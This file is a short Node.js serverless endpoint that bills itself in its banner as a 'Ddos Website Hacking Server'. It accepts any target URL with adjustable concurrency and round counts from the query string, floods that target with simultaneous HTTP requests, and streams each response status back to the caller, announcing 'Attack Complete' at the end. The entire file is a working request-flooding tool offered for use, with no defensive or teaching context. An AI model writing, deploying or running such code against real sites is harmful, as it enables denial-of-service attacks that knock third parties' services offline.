const fetch = require('node-fetch');

module.exports = async (req, res) => {
  const { target, c, r } = req.query;
  const concurrency = parseInt(c) || 5;
  const rounds = parseInt(r) || 5;

  if (!target) {
    res.status(400).send("Missing target parameter");
    return;
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");

  function send(data) {
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  }

  send({ msg: `=== Ddos Website Hacking Server Made By C9 UZAIR ===` });
  send({ msg: `Target: ${target}` });
  send({ msg: `Concurrent: ${concurrency}, Rounds: ${rounds}` });

  async function hit(id) {
    try {
      const response = await fetch(target);
      send({ id, status: response.status });
    } catch (e) {
      send({ id, error: e.message });
    }
  }

  let tasks = [];
  let counter = 0;
  for (let i = 0; i < rounds; i++) {
    for (let j = 0; j < concurrency; j++) {
      counter++;
      tasks.push(hit(counter));
    }
  }

  await Promise.all(tasks);
  send({ msg: "Attack Complete ✅" });
  res.end();
};
